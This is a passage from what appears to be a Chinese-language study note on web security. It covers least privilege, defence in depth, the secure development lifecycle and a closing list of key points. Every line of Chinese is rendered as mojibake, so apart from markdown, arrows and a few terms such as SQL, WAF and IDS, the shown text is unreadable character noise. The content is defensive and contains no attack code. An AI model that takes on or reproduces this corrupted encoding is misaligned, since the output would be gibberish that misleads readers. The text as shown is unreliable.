æ•°æ®åº“ç”¨æˆ·æƒé™æœ€å°åŒ– â†’ å‡å°‘SQLæ³¨å…¥å±å®³
åº”ç”¨ç¨‹åºæƒé™æœ€å°åŒ– â†’ é™ä½æ”»å‡»å½±å“èŒƒå›´
ç”¨æˆ·è®¿é—®æƒé™æœ€å°åŒ– â†’ é˜²æ­¢æƒé™æ»¥ç”¨
```

**ğŸ”¹ çºµæ·±é˜²æŠ¤ç­–ç•¥**
```
å¤šå±‚é˜²æŠ¤æœºåˆ¶ â†’ è¾“å…¥éªŒè¯+WAF+IDS
å®‰å…¨ç¼–ç è§„èŒƒ â†’ ä»æºå¤´é˜²æ­¢æ¼æ´
å®šæœŸå®‰å…¨æµ‹è¯• â†’ åŠæ—¶å‘ç°å’Œä¿®å¤æ¼æ´
```

### 7.3 å®‰å…¨å¼€å‘ç”Ÿå‘½å‘¨æœŸ


**ğŸ”¸ è®¾è®¡é˜¶æ®µ**
- å¨èƒå»ºæ¨¡åˆ†æ
- å®‰å…¨éœ€æ±‚å®šä¹‰
- å®‰å…¨æ¶æ„è®¾è®¡

**ğŸ”¸ å¼€å‘é˜¶æ®µ**
- å®‰å…¨ç¼–ç è§„èŒƒ
- ä»£ç å®‰å…¨å®¡æŸ¥
- é™æ€ä»£ç åˆ†æ

**ğŸ”¸ æµ‹è¯•é˜¶æ®µ**
- å®‰å…¨åŠŸèƒ½æµ‹è¯•
- æ¸—é€æµ‹è¯•
- æ¼æ´æ‰«æ

**ğŸ”¸ éƒ¨ç½²é˜¶æ®µ**
- å®‰å…¨é…ç½®æ£€æŸ¥
- ç”Ÿäº§ç¯å¢ƒåŠ å›º
- å®‰å…¨ç›‘æ§éƒ¨ç½²

### 7.4 å®é™…åº”ç”¨ä»·å€¼


- **å®‰å…¨å¼€å‘**ï¼šåœ¨å¼€å‘è¿‡ç¨‹ä¸­é¢„é˜²å®‰å…¨æ¼æ´
- **å®‰å…¨æµ‹è¯•**ï¼šä½¿ç”¨å®‰å…¨æµ‹è¯•æ–¹æ³•å‘ç°æ¼æ´
- **åº”æ€¥å“åº”**ï¼šå¿«é€Ÿè¯†åˆ«å’Œå¤„ç†å®‰å…¨äº‹ä»¶
- **åˆè§„è¦æ±‚**ï¼šæ»¡è¶³æ³•å¾‹æ³•è§„å’Œè¡Œä¸šæ ‡å‡†
- **ä¸šåŠ¡ä¿æŠ¤**ï¼šä¿æŠ¤æ ¸å¿ƒä¸šåŠ¡æ•°æ®å’Œç”¨æˆ·éšç§

**æ ¸å¿ƒè®°å¿†**ï¼š
- Webå®‰å…¨å¨èƒå¤šæ ·åŒ–ï¼Œéœ€è¦å…¨é¢é˜²æŠ¤
- è¾“å…¥éªŒè¯å’Œè¾“å‡ºç¼–ç æ˜¯åŸºç¡€é˜²æŠ¤æªæ–½
- å®‰å…¨æœºåˆ¶è¦åœ¨è®¾è®¡é˜¶æ®µå°±è€ƒè™‘è¿›å»
- å®‰å…¨æ˜¯æŒç»­çš„è¿‡ç¨‹ï¼Œéœ€è¦ä¸æ–­æ›´æ–°å’Œæ”¹è¿›